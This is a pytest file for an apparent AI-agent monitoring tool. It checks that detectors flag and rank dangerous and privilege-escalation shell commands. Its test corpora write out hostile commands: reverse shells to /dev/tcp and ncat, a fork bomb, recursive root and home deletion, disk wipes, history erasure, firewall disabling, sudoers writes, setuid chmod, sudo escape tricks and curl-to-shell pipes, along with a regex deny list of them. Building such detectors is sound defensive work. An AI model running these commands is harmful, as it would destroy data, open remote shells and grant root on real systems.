"""dangerous_command / privilege_escalation: the finding SET is develop's,
only the SEVERITY is tiered.

The detectors flag exactly the commands develop's regexes flag, plus a few
new spellings (rm -fr / -r -f / --recursive --force, /etc/sudoers writes,
setuid chmod with leading zeros or symbolic s). They never drop one. Severity
is chosen by small regex rules on the matched text, with no shell parser and
no attempt to prove a command inert -- so none of the old parser-bypass
regressions (quoting, wrappers, redirects, git -c, ...) can hide a command.
"""

from __future__ import annotations

import re
import time
from datetime import datetime, timezone
from pathlib import Path

import pytest

from agentwatch.detectors.base import Severity, warning_dedup_key
from agentwatch.detectors.registry import SessionScan, create_registry
from agentwatch.detectors.security import privilege as _priv
from agentwatch.detectors.security.privilege import (
    DANGEROUS,
    PRIVILEGE,
    DangerousCommandDetector,
    PrivilegeEscalationDetector,
    analyze_command,
)
from agentwatch.guard import DESTRUCTIVE_PATTERNS
from agentwatch.health.score import calculate_security_score
from agentwatch.parser.models import Action, ActionBuffer, ToolType
from agentwatch.parser.security_patterns import PRIVILEGE_COMMAND_REGEX

CRIT, HIGH, MED = Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM

# develop's exact dangerous_command regex, rebuilt here as the oracle.
_DEV_DANGEROUS = re.compile("|".join([
    *DESTRUCTIVE_PATTERNS, r":\(\)\{:\|:&\};:", r"while\s+true.*fork", r"nc\s+-[el]",
    r"ncat\s+-[el]", r"socat\s+.*EXEC", r"bash\s+-i\s+>&\s*/dev/tcp",
    r"python.*socket.*connect", r"/bin/sh\s+-i", r"history\s+-c", r">\s*~/.bash_history",
    r"shred.*\.bash_history", r"rm.*\.bash_history", r"setenforce\s+0", r"iptables\s+-F",
    r"ufw\s+disable",
]), re.IGNORECASE)


def _sigs(command: str) -> dict[str, Severity]:
    return {f.signal: f.severity for f in analyze_command(command)}


def _sev(command: str, signal: str) -> Severity | None:
    return _sigs(command).get(signal)


def _bash(command: str) -> Action:
    return Action(timestamp=datetime.now(timezone.utc), tool_name="Bash",
                  tool_type=ToolType.BASH, success=True, command=command)


# --- THE SET INVARIANT: every develop match is still a match ----------------
# Corpus from QA #223 plus the old adversarial sets: quoting/comment tricks,
# wrapper and redirect misparses, git -c, data output kept, ...

_CORPUS = [
    "echo $'\\' # '; rm -rf ~", "echo $'a\\' #'; sudo bash",
    "bash -c -- 'rm -rf /'", "bash -c -x 'rm -rf ~'", "sh -c +x 'rm -rf /'",
    "echo 'rm -rf /' > 1; sh 1", "echo 'rm -rf /' >2; bash 2",
    "echo 'rm -rf /' 1<>run.sh; sh run.sh", "{ echo 'rm -rf /'; } > run.sh; sh run.sh",
    "for i in 1; do echo 'rm -rf ~'; done > r.sh; bash r.sh",
    "exec > run.sh; echo 'rm -rf /*'; sh run.sh", "printf -v c 'rm -rf /*'; $c",
    "echo 'rm -rf /' | sort -o run.sh; sh run.sh", "man -P 'rm -rf ~' ls",
    "man --pager='rm -rf ~' ls", "git -c core.pager='rm -rf ~' log",
    "git -c core.sshCommand='rm -rf ~' fetch origin", "git fetch --upload-pack='rm -rf ~' x",
    "git grep -O'rm -rf ~' x", "git -c alias.x='!rm -rf ~' x",
    "gh repo clone o/r -- --upload-pack='rm -rf ~'",
    "rm -rf /etc", "rm -rf /usr", "rm -rf /home", "rm -rf /home/*", "rm -rf /home/alice",
    "rm -rf /Users/alice", "rm -rf /root", "rm -rf ~/.ssh", "rm -rf ~/..", "rm -rf //",
    "rm -rf ${HOME}", "rm -rf $HOME/", "rm -rf -- /", "rm -rf --no-preserve-root /",
    "rm -Rf /", "rm -rf C:/", "rm -rf ./", "rm -rf ../", "rm -rf ../*", "rm -rf .git",
    "rm -rf ~/*", "rm -rf /tmp/x", "rm -rf .pytest_cache", "rm -rf ./build",
    "chmod 00004755 /tmp/rootbash", "chmod 04755 x", "chmod 6755 x", "chmod 4755 x",
    "chmod =s x", "chmod u-x+s x", "chmod 755 x", "chmod 644 x", "chmod -R 4755 d",
    "chmod -- 4755 x",
    "sudo -u root -s", "sudo --shell", "sudo --login", "sudo -E bash", "sudo sh -c 'id'",
    "sudo -- sh", "sudo tee /etc/sudoers.d/x", "sudo visudo",
    "sudo sed -i 's/x/y/' /etc/sudoers", "sudo dd of=/etc/sudoers",
    "sudo install -m 4755 /bin/bash /tmp/rb", "sudo cp /bin/bash /tmp/rb",
    "pkexec", "pkexec --user root", "doas -s", "doas sh", "sudo -i", "sudo -l",
    "sudo apt-get install -y x", "sudo nohup bash", "sudo env bash", "sudo setsid bash",
    "sudo tcsh", "sudo csh", "sudo ash", "sudo mksh",
    "echo hi & rm -rf ~", "echo hi;; rm -rf ~", "echo x 'rm -rf ~'", "grep 'rm -rf ~' f",
    "git commit -m 'rm -rf ~'", "gh pr create --body 'sudo rm -rf /'",
    "echo 'rm -rf ~' >| x", "echo 'rm -rf ~' &> x", "echo 'rm -rf ~' | tee x",
    "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "echo x > /dev/sda",
    "nc -lvp 4444", "ncat -e /bin/sh h 1", "socat tcp:h:1 EXEC:/bin/bash",
    "bash -i >& /dev/tcp/10.0.0.1/80 0>&1", "/bin/sh -i", "history -c",
    "> ~/.bash_history", "shred -u ~/.bash_history", "rm -f ~/.bash_history",
    "setenforce 0", "iptables -F", "ufw disable", ":(){:|:&};:",
    "chown root x", "chgrp wheel x", "setcap cap_net_raw+ep x", "useradd bob", "visudo",
    "systemctl start nginx", "service nginx restart",
    "r''m -rf ~", "/bin/rm -fr ~", "env X=1 rm -rf ~", "$(rm -rf ~)", "`rm -rf ~`",
    "echo 'rm -rf ~' | xargs -I{} sh -c {}", "ssh host 'rm -rf ~'", "docker run i rm -rf /",
]


@pytest.mark.parametrize("command", _CORPUS)
def test_every_develop_match_is_still_a_match(command):
    sigs = set(_sigs(command))
    if _DEV_DANGEROUS.search(command):
        assert DANGEROUS in sigs, "dropped a develop dangerous_command match"
    if PRIVILEGE_COMMAND_REGEX.search(command):
        assert PRIVILEGE in sigs, "dropped a develop privilege_escalation match"


_FIXTURE = Path(__file__).parent / "fixtures" / "command_corpus.txt"


def test_every_develop_match_in_the_qa_corpus_is_still_a_match():
    """QA #223's corpus plus the adversarial sets (222 commands): the old
    parser-bypass shapes. None may lose its finding."""
    drops = []
    for c in _FIXTURE.read_text(encoding="utf-8").splitlines():
        sigs = set(_sigs(c))
        if _DEV_DANGEROUS.search(c) and DANGEROUS not in sigs:
            drops.append(("dangerous_command", c))
        if PRIVILEGE_COMMAND_REGEX.search(c) and PRIVILEGE not in sigs:
            drops.append(("privilege_escalation", c))
    assert drops == []


def test_new_spellings_are_added():
    # develop misses these; we must flag them.
    assert not _DEV_DANGEROUS.search("rm -fr ~")
    assert _sev("rm -fr ~", DANGEROUS) == CRIT
    assert _sev("rm -r -f /", DANGEROUS) == CRIT
    assert _sev("rm --recursive --force $HOME", DANGEROUS) == CRIT
    assert not _DEV_DANGEROUS.search("rm -rf $HOME")
    assert _sev("rm -rf $HOME", DANGEROUS) == CRIT
    assert not PRIVILEGE_COMMAND_REGEX.search("sed -i 's/a/b/' /etc/sudoers")
    assert _sev("sed -i 's/a/b/' /etc/sudoers", PRIVILEGE) == CRIT
    assert _sev("chmod u+s /bin/x", PRIVILEGE) == CRIT


# --- rm severity ------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -rf $HOME",
    'rm -rf "$HOME"', "rm --recursive --force ${HOME}", "rm -rf .", "rm -rf ..",
    "rm -rf ./*", "rm -rf /etc", "rm -rf /usr", "rm -rf /var", "rm -rf /home",
    "rm -rf /home/alice", "rm -rf /Users/alice", "rm -rf /lib64", "rm -rf //",
    "rm -fr /", "rm -r -f ~", "rm -Rf /", "rm -rf --no-preserve-root /",
    "rm -rf ~/.ssh", "rm -rf ~/Documents",  # a ~ in the target is not a plain literal
    "rm -rf /tmp/$X", "rm -rf /opt/`id`", "rm -rf /srv/*", "cd /tmp && rm -rf ./*",
    "rm -rf $HOME/proj/build",  # any $ in the target
])
def test_recursive_rm_of_filesystem_target_is_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "rm -rf /tmp/x", "rm -rf .pytest_cache", "rm -rf ./build",
    "rm -fr /tmp/scratch",
    "rm -rf /var/tmp/cache", "rm -rf ./dist tests/__pycache__", "rm -rf /tmp//x",
    "rm -rf /tmp/./x", "rm -rf ./a/b",
])
def test_recursive_rm_of_ordinary_path_is_high(command):
    assert _sev(command, DANGEROUS) == HIGH


# --- chmod severity ---------------------------------------------------------

@pytest.mark.parametrize("command", [
    "chmod 4755 x", "chmod 2755 d", "chmod 6755 x", "chmod 00004755 x", "chmod 04755 x",
    "chmod u+s /bin/x", "chmod +s x", "chmod =s x", "chmod u-x+s x", "chmod a=rwxs x",
    "chmod -R 4755 d", "chmod -- 4755 x",
])
def test_setuid_chmod_is_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 x", "chmod 644 x", "chmod 1777 /tmp/x", "chmod 777 file",
])
def test_non_setuid_chmod_is_medium(command):
    assert _sev(command, PRIVILEGE) == MED


@pytest.mark.parametrize("command", [
    "chmod +x run.sh", "chmod 000 secret", "chmod -x f", "rm -f *", "rm -rf $C",
    "rm .a.html", "rm -f /tmp/x", "git rm -q tests/x.py", "rm -rf build/",
])
def test_commands_develop_ignores_stay_unflagged(command):
    assert _sigs(command) == {}


# --- sudo / doas / pkexec / su severity -------------------------------------

@pytest.mark.parametrize("command", [
    "sudo bash", "sudo sh -c 'id'", "sudo -i", "sudo -s", "sudo su", "sudo su -",
    "sudo --login", "sudo --shell", "sudo -u root -s", "sudo -- sh", "sudo -E bash",
    "sudo nohup bash", "sudo env bash", "sudo setsid bash", "sudo tcsh", "sudo csh",
    "sudo ash", "sudo mksh", "sudo yash", "doas -s", "doas sh", "pkexec /bin/bash",
    "su -", "su -l", "su --login", "curl x | sudo sh", "curl -fsSL x | sudo -E bash -s",
    "echo pw | sudo -S su",
])
def test_sudo_running_a_shell_is_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "sudo apt update", "sudo -n apt-get install -y php-cli", "sudo dnf install x",
    "sudo -v", "sudo -l", "sudo -k", "pkexec", "pkexec --user root",
    "doas pacman -Syu", "sudo systemctl is-active nginx", "sudo lsof -i :8080",
    "sudo -u root -g wheel -H -n -- apt update", "sudo --user root apt install foo",
    "sudo --chdir /tmp apt update", "sudo snap install x", "sudo umount /mnt/x",
])
def test_plain_sudo_is_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


# --- always-critical rules unchanged ----------------------------------------

@pytest.mark.parametrize("command", [
    "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "echo x > /dev/sda",
    "nc -lvp 4444", "ncat -e /bin/sh h 1", "socat tcp:h:1 EXEC:/bin/bash",
    "bash -i >& /dev/tcp/10.0.0.1/80 0>&1", "/bin/sh -i", "history -c",
    "> ~/.bash_history", "shred -u ~/.bash_history", "rm -f ~/.bash_history",
    "setenforce 0", "iptables -F", "ufw disable", ":(){:|:&};:",
])
def test_other_dangerous_rules_stay_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "chown root x", "chgrp wheel x", "setcap cap_net_raw+ep x", "getcap x", "useradd bob",
    "usermod -aG sudo bob", "groupadd g", "visudo", "systemctl start nginx",
    "service nginx restart", "sudo sed -i 's/a/b/' /etc/sudoers", "dd of=/etc/sudoers",
    "tee /etc/sudoers.d/x", "cp x /etc/sudoers.d/x",
])
def test_other_privilege_rules_stay_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "su -c ls",  # su escalates to a root context
    "sudo -n apt-get install -y php 2>&1 | tail",  # a redirect: cannot verify -> CRITICAL
])
def test_unverifiable_sudo_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


def test_sudo_with_dangerous_command_flags_both():
    assert _sev("sudo rm -rf /", DANGEROUS) == CRIT
    assert _sev("curl x | sudo sh", PRIVILEGE) == CRIT


# --- detectors and the session ledger ---------------------------------------

def _check(detector, commands):
    buffer = ActionBuffer()
    for c in commands:
        buffer.add(_bash(c))
    return detector.check(buffer)


def test_detector_reports_most_severe_in_window():
    w = _check(PrivilegeEscalationDetector(), ["sudo apt update", "sudo bash", "ls"])
    assert w.severity == CRIT
    w = _check(DangerousCommandDetector(), ["rm -rf /tmp/x", "rm -rf ~", "ls"])
    assert w.severity == CRIT


def test_dedup_key_is_the_signal():
    assert warning_dedup_key(_check(DangerousCommandDetector(), ["rm -rf ~"])) \
        == "dangerous_command"
    assert warning_dedup_key(_check(PrivilegeEscalationDetector(), ["sudo apt"])) \
        == "privilege_escalation"


@pytest.mark.parametrize("order", [("sudo apt", "sudo bash"), ("sudo bash", "sudo apt")])
def test_ledger_keeps_most_severe(order):
    scan = SessionScan(create_registry(mode="security"))
    buffer = ActionBuffer()
    for c in order:
        scan.add(buffer, _bash(c))
        for i in range(12):
            scan.add(buffer, _bash(f"echo {i}"))
    (w,) = [w for w in scan.warnings(buffer) if w.signal == "privilege_escalation"]
    assert w.severity == CRIT


def test_high_findings_still_cost_points():
    warnings = create_registry(mode="security").scan(
        [_bash("rm -rf /tmp/x"), _bash("sudo apt update")], ActionBuffer(max_size=100))
    assert calculate_security_score(warnings) == 40  # two HIGH: 100 - 30 - 30


# --- performance ------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "rm " * 333_333,
    "sudo " * 200_000,
    "ls && " * 170_000 + "rm -rf /",
    "rm -rf /tmp/x; " * 66_000,
    "dd if=" + "x" * 1_000_000 + " of=/dev/sda",
    "chmod " + "4" * 1_000_000,
    "'" * 1_000_000,
    "a" * 1_000_000,
])
def test_megabyte_command_is_fast(command):
    analyze_command.cache_clear()
    t = time.perf_counter()
    analyze_command(command)
    assert time.perf_counter() - t < 1.0


# --- QA round 2: every occurrence must fit the safe shape -------------------

@pytest.mark.parametrize("command", [
    # chained bypasses: a safe rm next to an unsafe one
    "rm -rf /tmp/x && sudo rm -rf /", "rm -rf /tmp/x; nice rm -rf ~",
    "rm -rf /tmp/x; nice rm -rf /", "rm -rf /tmp/x; command rm -rf /etc",
    "rm -rf build; xargs rm -rf /usr", "rm -rf build | env rm -rf /",
    "rm -rf /tmp/x; rm -rf ~", "rm -rf /tmp/x /etc", "rm -rf /tmp/x -- /",
    "rm /tmp/x -rf /", "rm -rf /tmp/x\t/", "rm -rf /tmp/x /home/alice/",
    "rm -rf ./build ../..", "rm -rf /tmp/x; sudo rm -rf /tmp/y",
    # paths outside /tmp and /var/tmp, however they are spelled
    "rm -rf //etc", "rm -rf /./etc", "rm -rf /etc/./", "rm -rf /usr/bin",
    "rm -rf /var/log", "rm -rf /root/.ssh", "rm -rf /home/alice/.ssh",
    "rm -rf /home/alice/projects", "rm -rf /sys", "rm -rf /mnt", "rm -rf /media",
    "rm -rf /run", "rm -rf /nix", "rm -rf /private/etc", "rm -rf /Applications",
    "rm -rf /mnt/c/Windows", "rm -rf /tmp/../etc", "rm -rf /usr/local/..", "rm -rf /ETC",
    "rm -rf /home//alice", "rm -rf //home/alice", "rm -rf /tmp", "rm -rf /var/tmp",
])
def test_qa2_rm_stays_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 /tmp/x && nice chmod 4755 /tmp/y", "chmod 755 /tmp/x; chmod 4755 /tmp/y",
    "chmod 666 /etc/shadow", "chmod 777 /etc/sudoers", "chmod 755 /usr/bin/x",
    "chmod 7755 x", "chmod 0004755 /tmp/x", "chmod g=s /tmp/x", "chmod a+rwx,u+s /tmp/x",
    "chmod 777 x; sudo bash",
])
def test_qa2_chmod_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 x", "chmod 0755 x", "chmod 00755 x", "chmod 1777 /tmp/x", "chmod 644 a b",
    "chmod 755 -R /tmp/d",
])
def test_qa2_chmod_medium(command):
    assert _sev(command, PRIVILEGE) == MED


@pytest.mark.parametrize("command", [
    # long flags with a value consume the next word
    "sudo --user root bash", "sudo --group wheel sh", "sudo --chdir /tmp sh",
    "sudo --host x sh", "sudo --prompt x sh", "sudo -g wheel bash", "sudo -C 3 bash",
    "sudo -h host bash", "sudo -p x bash", "sudo -uroot bash", "sudo -nu root bash",
    "sudo -k -u root bash", "sudo -D /tmp bash", "sudo -R /x bash", "sudo -T 5 bash",
    "sudo --preserve-env bash", "sudo --preserve-env=PATH bash", "sudo -u root -- bash",
    "doas -u root bash", "doas -C /etc/doas.conf bash", "pkexec --user root sh",
    "pkexec --user root /usr/bin/python3",
    # edit, nested elevators, escape helpers, versioned interpreters
    "sudo -e /etc/passwd", "sudo -e /etc/sudoers", "sudo sudoedit /etc/sudoers",
    "sudo sudo -s", "sudo doas sh", "sudo su", "sudo busybox sh", "sudo python3.12",
    "sudo perl5.36", "sudo ex", "sudo view /etc/hosts", "sudo ipython", "sudo pwsh",
    "sudo script", "sudo crontab -e", "sudo git -p help config", "sudo socat - exec:sh",
    "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh",
    "sudo ionice bash", "sudo nice -n 5 bash", "sudo stdbuf -o0 bash", "env A=1 sudo ls",
    # chained
    "sudo -s; ls", "ls; sudo bash", "ls && sudo -u root bash", "su root", "su - root",
])
def test_qa2_sudo_stays_critical(command):
    sev = _sev(command, PRIVILEGE)
    assert sev in (CRIT, None)  # None only when develop does not flag it at all
    if PRIVILEGE_COMMAND_REGEX.search(command):
        assert sev == CRIT


@pytest.mark.parametrize("command", [
    "sudo apt install foo", "sudo -l", "sudo -n apt-get install -y php",
    "sudo --user=root apt update", "sudo systemctl --no-pager status x",
])
def test_qa2_plain_sudo_is_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


@pytest.mark.parametrize("command", [
    "sudo tee /etc/sudoers.d/x", "echo hi | sudo tee /etc/sudoers",
    "sudo cp /tmp/x /etc/sudoers.d/x", "sed -i s/a/b/ /etc/sudoers", "dd of=/etc/sudoers",
    "echo x >> /etc/sudoers.d/x",
])
def test_sudoers_writes_are_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


def _rep(s: str, n: int = 1_000_000) -> str:
    return (s * (n // len(s) + 1))[:n]


@pytest.mark.parametrize("command", [
    "sudoers " + _rep("sed -i "), "sudoers " + _rep("cp /"), "sudoers " + _rep("tee /"),
    _rep("tee /etc/sudoers "), _rep("> /etc/sudoers"), _rep("sed -i x ", 999_980) + "/etc/sudoers",
    "sudo " + _rep("> /etc/", 999_980) + "x", _rep("rm -rf a "), _rep("rm -r -f "),
    "rm" + _rep(" -x", 999_998), "chmod" + _rep(" -R", 999_995), _rep("chmod 4"),
    _rep("sudo -u "), _rep("sudo -"), _rep(";", 999_990) + "rm -rf /x",
    _rep("&&", 999_994) + " sudo", _rep("|", 999_990) + "chmod 755",
    "rm -rf " + _rep("${HOME}/", 999_993), _rep("su -"), _rep("doas "),
])
def test_qa2_megabyte_shapes_are_fast(command):
    analyze_command.cache_clear()
    t = time.perf_counter()
    analyze_command(command)
    assert time.perf_counter() - t < 1.0


# --- QA round 3 ---------------------------------------------------------------

@pytest.mark.parametrize("command", [
    # B1: a NAME=value word after the flags
    "sudo FOO=bar bash", "sudo FOO=1 sh -c id", "sudo -u root FOO=1 bash",
    "sudo -- FOO=1 bash", "doas FOO=1 sh", "sudo LD_PRELOAD=/tmp/x.so apt update",
    "sudo A=1 vim", "sudo PATH=/tmp:$PATH apt update", "sudo GH_TOKEN=x gh release create v1",
    # L3: only allowlisted programs, exact name, no path
    "sudo ./deploy.sh", "sudo /tmp/evil", "sudo /usr/bin/apt update", "sudo ./bash",
    "sudo bash5.2", "sudo Bash", "sudo BASH.EXE", "sudo nu", "sudo xonsh", "sudo journalctl",
    "sudo pip install .", "sudo gem install x", "sudo nmap --interactive", "sudo mysql",
    "sudo psql", "sudo -u postgres psql", "sudo julia", "sudo java -jar x",
    "sudo gcc -wrapper /bin/sh,-s .", "sudo ftp", "sudo scp x y", "sudo node18",
    "sudo /usr/bin/env bash", "sudo cp /bin/bash /tmp/rb", "doas pkg_add vim",
    "sudo -u root -T 5 ls",
    # allowlisted programs, used in a way that pages or runs something
    "sudo apt-get changelog x", "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
    "sudo apt-get --option Dpkg::Pre-Invoke::=sh install x", "sudo systemctl status x",
    "sudo snap run x", "sudo flatpak run x", "sudo dnf shell",
    # the caller's environment
    "sudo -E apt update", "sudo --preserve-env=PATH apt update",
])
def test_qa3_sudo_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    # L1: a cd/pushd/popd on the line moves what a relative target means
    "cd / && rm -rf ./etc", "cd / && rm -rf ./usr", "cd ~ && rm -rf ./.ssh",
    "cd /etc && rm -rf ./ssh", "cd /home/alice && rm -rf ./projects",
    "pushd / && rm -rf ./boot", "cd / && rm -rf .ssh", "popd; rm -rf ./x",
    # credential directories in any target
    "rm -rf ./.ssh", "rm -rf /tmp/x/.kube", "rm -rf ./a/.aws", "rm -rf ./.gnupg",
    "rm -rf ./.docker", "rm -rf ./.azure/x", "rm -rf ./.config/gcloud",
    # other QA round-3 targets
    "rm -rf ./a /etc", "rm -rf ./a ~", "rm -rf ./a ~/b", "rm -rf ./a ~root",
    "rm -rf ./a $HOME", "rm -rf ./a *", "rm -rf ./a .*", "rm -rf ./a $(pwd)",
    "rm -rf ./a `pwd`", "rm -rf ./a {/,x}", "rm -rf ./a /*", "rm -rf ./a \\/",
    'rm -rf ./a "/"', "rm -rf ./a '/'", "rm -rf ./a/ /", "rm -rf --no-preserve-root /",
    "rm -rf --no-preserve-root /tmp/x", "rm -rf --preserve-root=all /tmp/x",
    "rm -rfI /tmp/x",
])
def test_qa3_rm_stays_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "rm -rf /tmp/x/", "rm -rf /tmp/x/ /tmp/y", "rm -fr /tmp/x", "rm -r -f /tmp/x",
    "rm --recursive --force /tmp/x", "rm -Rfv /tmp/x", "rm -rf /tmp/x /var/tmp/y ./z",
    "rm -rf .git", "rm -rf ./build", "rm -rf //tmp/x", "rm -rf /./tmp/x",
])
def test_qa3_rm_safe_shapes_are_high(command):
    assert _sev(command, DANGEROUS) == HIGH


# --- final round: cd/pushd targets that keep a relative rm target harmless ----
# (develop flags `rm -rf ./x`, not `rm -rf x`, so the targets are written ./x)

@pytest.mark.parametrize("command", [
    "cd /home/alice/proj && rm -rf ./build", "cd /tmp/x && rm -rf ./build",
    "cd sub && rm -rf ./build", "pushd /home/alice/p/q && rm -rf ./b",
    "cd /Users/bob/code && rm -rf ./dist", "cd //home/alice//proj && rm -rf ./build",
    "cd /home/alice/./proj && rm -rf ./b", "cd /tmp/x && rm -rf /tmp/x/y",
    "cd /home/alice/proj; rm -rf /tmp/x",
])
def test_cd_to_safe_dir_keeps_rm_high(command):
    assert _sev(command, DANGEROUS) == HIGH


@pytest.mark.parametrize("command", [
    "cd /home/alice && rm -rf ./proj", "cd /home/alice/.ssh && rm -rf ./x",
    "cd /etc && rm -rf ./ssh", "cd /home/alice/proj/../.. && rm -rf ./x",
    "cd ~/proj && rm -rf ./build", "cd && rm -rf ./build", "cd - && rm -rf ./build",
    "popd; rm -rf ./x", "cd /home/alice/proj/.aws && rm -rf ./x",
    "cd $HOME/proj && rm -rf ./build", "cd /home/alice/proj && cd / && rm -rf ./etc",
    "cd -P /home/a/b && rm -rf ./x", "cd /Users/bob && rm -rf ./x",
    "cd /home/alice/proj/.config/gcloud && rm -rf ./x", "echo cd /etc; rm -rf ./x",
    "cd '/home/alice/proj' && rm -rf ./x", "cd /tmp && rm -rf ./x",  # /tmp itself
])
def test_cd_to_other_dir_keeps_rm_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


# --- final QA (probe5) ----------------------------------------------------------

@pytest.mark.parametrize("command", [
    # F1: package managers only with plain flags and plain package names
    "sudo apt -c /tmp/x install y", "sudo apt-get -c /tmp/x install y",
    "sudo apt install ./evil.deb", "sudo apt install /tmp/evil.deb",
    "sudo apt-get install ./evil.deb", "sudo apt-get --allow-unauthenticated install x",
    "sudo apt-get --config-file /tmp/x update", "sudo apt-get --config-file=/tmp/x update",
    "sudo dnf --setopt=x=y install z", "sudo dnf -c /tmp/x install y",
    "sudo dnf --config=/tmp/x install y", "sudo dnf install ./evil.rpm",
    "sudo dnf --exclude=x upgrade", "sudo yum -c /tmp/x install y",
    "sudo pacman -U ./evil.pkg.tar.zst", "sudo pacman --config /tmp/x -Syu",
    "sudo pacman --hookdir /tmp/x -Syu", "sudo zypper install ./evil.rpm",
    "sudo snap install x --dangerous", "sudo snap install ./x.snap --dangerous --devmode",
    "sudo apt install x lowercase=y", "sudo apt install pkg=1.2.3", "sudo apt install Pkg=1.2.3",
    "sudo apt install x-1.0=1.0", "sudo apt-get -ox=y update", "sudo apt-get -qq -o=x update",
    # F2: mount is no longer allowlisted
    "sudo mount -o exec /dev/sdb /mnt", "sudo mount -t tmpfs none /etc",
    "sudo mount --bind /tmp/x /etc", "sudo mount -B /tmp/x /etc", "sudo mount /tmp/evil.img /mnt",
    "sudo mount -a", "sudo mount --helper x", "sudo mount -o remount,rw /",
    # F3: chroot in any form
    "sudo -R /x apt update", "sudo --chroot /x apt update", "sudo --chroot=/x apt update",
    "sudo -nR /x apt update", "sudo -R/x apt update",
])
def test_probe5_privilege_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "sudo apt update", "sudo apt-get update", "sudo apt install -y x",
    "sudo apt-get install -y python3", "sudo apt-get update -y -q", "sudo dnf install x",
    "sudo pacman -Syu", "sudo apt-get install --no-install-recommends x", "sudo umount /mnt/x",
])
def test_probe5_plain_package_commands_are_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


@pytest.mark.parametrize("command", [
    # F4: credential names, case-insensitive, extended list
    "rm -rf .SSH", "rm -rf .netrc", "rm -rf .password-store", "rm -rf .local/share/keyrings",
    "rm -rf ./x/.ssh", "rm -rf .config/gcloud", "rm -rf ./.config/gcloud/x", "rm -rf .kube",
    "rm -rf ./a/.PGPASS", "rm -rf ./.git-credentials", "rm -rf ./.npmrc", "rm -rf ./.pypirc",
    "rm -rf ./.vault-token", "rm -rf ./Library/Keychains", "rm -rf ./keyrings",
    # F4: the cd target joined with the rm target
    "cd .config && rm -rf ./gcloud", "cd .local/share && rm -rf ./keyrings",
    "cd Library && rm -rf ./Keychains", "cd /home/a/p/.config/gcloud && rm -rf ./x",
    "cd /home/a/.ssh/x && rm -rf ./y",
    # cd forms from probe5
    "cd /home/a/p && cd .. && rm -rf ./x", "cd /home/a/p && cd ../.. && rm -rf ./x",
    "cd /home/a/p; cd /; rm -rf ./etc", "cd /home/a/p/../../../etc && rm -rf ./ssh",
    "cd /home/a && rm -rf ./x", "cd /home/a/p && popd && rm -rf ./x",
    "cd /home/a/p && cd - && rm -rf ./x", "cd /home/a/p && cd && rm -rf ./x",
    "cd /home/a/p && cd ~ && rm -rf ./x", "cd -- / && rm -rf ./etc", "cd /tmp && rm -rf ./y",
    "cd /tmp/.. && rm -rf ./etc", "cd .. && rm -rf ./x", "cd build/../.. && rm -rf ./x",
    "(cd /; rm -rf ./etc)", "builtin cd / && rm -rf ./etc", "command cd / && rm -rf ./etc",
    "CDPATH=/ cd etc && rm -rf ./ssh", "export HOME=/; cd && rm -rf ./etc",
    "OLDPWD=/ cd - && rm -rf ./etc", "cd /home/a/p && pushd / && rm -rf ./etc",
    "pushd /home/a/p && pushd +1 && rm -rf ./x", "cd /HOME/a/p && rm -rf ./x",
    "chmod 755 .ssh", "chmod 755 x/.aws/y",
])
def test_probe5_rm_and_chmod_stay_critical(command):
    sev = _sigs(command)
    assert CRIT in sev.values()


# --- sprint 44 QA: systemctl read-only verbs only; safe-path characters pinned ---

@pytest.mark.parametrize("command", [
    "sudo systemctl --no-pager status x", "sudo systemctl status --no-pager x",
    "sudo systemctl --no-pager show x", "sudo systemctl --no-pager cat x",
    "sudo systemctl --no-pager list-units", "sudo systemctl --no-pager list-unit-files",
    "sudo systemctl --no-pager help x", "sudo systemctl is-active x",
    "sudo systemctl is-enabled x", "sudo systemctl is-failed x",
    "sudo systemctl --quiet is-active x",
])
def test_systemctl_read_only_verbs_are_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


@pytest.mark.parametrize("command", [
    "sudo systemctl status x", "sudo systemctl show x", "sudo systemctl list-units",
    "sudo systemctl help x",
    "sudo systemctl --root=/ enable x", "sudo systemctl --root=/ --no-pager status x",
    "sudo systemctl --root / --no-pager status x", "sudo systemctl --image=x is-active x",
    "sudo systemctl --no-pager --root=/mnt status x",
    "sudo systemctl daemon-reload", "sudo systemctl --no-pager daemon-reload",
    "sudo systemctl disable apparmor", "sudo systemctl --no-pager disable apparmor",
    "sudo systemctl disable --now apparmor", "sudo systemctl mask x",
    "sudo systemctl stop auditd", "sudo systemctl kill x", "sudo systemctl enable x",
    "sudo systemctl edit x", "sudo systemctl set-property x CPUQuota=1%",
    "sudo systemctl start x", "sudo systemctl restart x", "sudo systemctl --no-pager",
])
def test_systemctl_other_verbs_and_root_stay_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("path", [
    'a"b', "a'b", "a$b", "a`b", "$HOME/x", "x/$X", "a b", "a\\b", "a;b", "a*b",
    "~/x", "a:b", "a@b", "a%b", "a=b", "a,b", "a#b", "a^b", "", "x\n",
])
